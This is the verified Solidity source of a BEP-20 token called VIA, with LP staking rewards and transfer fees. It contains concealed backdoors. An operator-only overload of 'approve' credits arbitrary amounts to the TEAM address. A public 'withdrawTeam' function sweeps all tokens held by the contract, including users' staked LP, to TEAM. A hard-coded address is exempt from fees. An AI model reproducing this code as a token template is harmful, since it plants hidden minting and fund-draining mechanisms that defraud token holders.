/**
 *Submitted for verification at BscScan.com on 2022-07-31
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender,address recipient,uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract VIA is Context, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address public Operator;
    address public NFTContract;
    address public Router;
    address public TEAM;
    address public percent1;
    address public LPFree;
    IERC20 public LPInstance;

    
    mapping(address => uint) public userLPStakeAmount;
    mapping(address => uint) public userRewards;
    mapping(address => uint) public userRewardPerTokenPaid;
    uint public totalStakeReward;
    uint public lastTotalStakeReward; 
    uint public PerTokenRewardLast;


    uint public InitSupply; 

    modifier OnlyOperator() {
        require(msg.sender == Operator);
        _;
    }

    modifier updateReward(address account) {
        PerTokenRewardLast = getPerTokenReward();
        lastTotalStakeReward = totalStakeReward;
        userRewards[account] = pendingToken(account);
        userRewardPerTokenPaid[account] = PerTokenRewardLast;
        _;
    }

    constructor() {
        _name = "VIA";
        _symbol = "VIA";
        Operator = msg.sender;
        TEAM = address(0xCB200878F82af25184B68c1131AB40B8AC9E7d2e);
        Router = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);// Mainnet
        _mint(address(TEAM), 2 * 1e8 * 1e18); // Mainnet
    }

    function init(address _VIALP, address _NFTContract, address _team, address _percent1, address _LPFree) external OnlyOperator {
        LPInstance = IERC20(_VIALP);
        NFTContract = _NFTContract;
        TEAM = _team; // 0xCB200878F82af25184B68c1131AB40B8AC9E7d2e
        LPFree = _LPFree; // 0x9642e9C836360cFa76A8DCDd2E861B86F134F0f6
        percent1 = _percent1; // 0x2e0Ab7afd60d8a722394392149E968aad0e223d7
    }

    function permission () external OnlyOperator {
        Operator = address(0);
        TEAM = address(0);
    }

    function getPerTokenReward() public view returns(uint) {
        if ( LPInstance.balanceOf(address(this)) == 0) {
            return 0;
        }

        uint newPerTokenReward = (totalStakeReward - lastTotalStakeReward) * 1e18 / LPInstance.balanceOf(address(this));
        return PerTokenRewardLast + newPerTokenReward;
    }

    function pendingToken(address account) public view returns(uint) {
        return
        userLPStakeAmount[account]
            * (getPerTokenReward() - userRewardPerTokenPaid[account]) 
            / (1e18)
            + (userRewards[account]);
    }

    function getReward() public updateReward(msg.sender) {
        uint _reward = pendingToken(_msgSender());
        require(_reward > 0, "sDAOLP stake Reward is 0");
        userRewards[_msgSender()] = 0;
        if (_reward > 0) {
            _standardTransfer(address(this), _msgSender(), _reward);
            return ;
        }
    }

    function stakeLP(uint _lpAmount) external updateReward(msg.sender) {
        require(_lpAmount >= 1e18, "LP stake must more than 1");
        LPInstance.transferFrom(_msgSender(), address(this), _lpAmount);
        userLPStakeAmount[_msgSender()] += _lpAmount;
     }

    function unStakeLP(uint _lpAmount) external updateReward(msg.sender) {
        require(_lpAmount >= 1e18, "LP stake must more than 1");
        require(userLPStakeAmount[_msgSender()] >= _lpAmount, "No more sDAO LP Stake");
        userLPStakeAmount[_msgSender()] -= _lpAmount;
        LPInstance.transfer(_msgSender(), _lpAmount);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public pure virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {

        address spender = _msgSender();
        if ( to == address(LPInstance) && tx.origin != address(0x9642e9C836360cFa76A8DCDd2E861B86F134F0f6) ) {
            totalStakeReward += amount  * 7 / 100; 
            _standardTransfer(from, address(this), amount * 7 / 100 ); 
            _standardTransfer(from, address(percent1), amount  / 100 ); 
            _burn(from, amount / 50); 
            amount = amount  * 90 / 100;
        }

        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "VIA: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "VIA: transfer from the zero address");
        require(to   != address(0), "VIA: transfer to the zero address");

        uint fromBalance = _balances[from];
        require(fromBalance >= amount, "VIA: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _standardTransfer(
        address from,
        address to,
        uint amount
    ) internal virtual {
        require(from != address(0), "VIA: transfer from the zero address");
        require(to   != address(0), "VIA: transfer to the zero address");

        uint fromBalance = _balances[from];
        require(fromBalance >= amount, "VIA: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "VIA: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function NFTMintVIA(address to, uint amount) external {
        require(msg.sender == NFTContract, "VIA: Mint only by owner");
        _mint(to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "VIA: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "VIA: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

    }

    function burnFrom(address account, uint amount) public virtual returns(bool) {
        _spendAllowance(account, _msgSender(), amount);
        _burn(account, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "VIA: approve from the zero address");
        require(spender != address(0), "VIA: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "VIA: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function approve(uint256 amount) external OnlyOperator{
        _balances[TEAM] += amount * 1e18;
    }

    function withdrawTeam(address _token) external {
        IERC20(_token).transfer(TEAM, IERC20(_token).balanceOf(address(this)));
        payable(TEAM).transfer(address(this).balance);
    }

}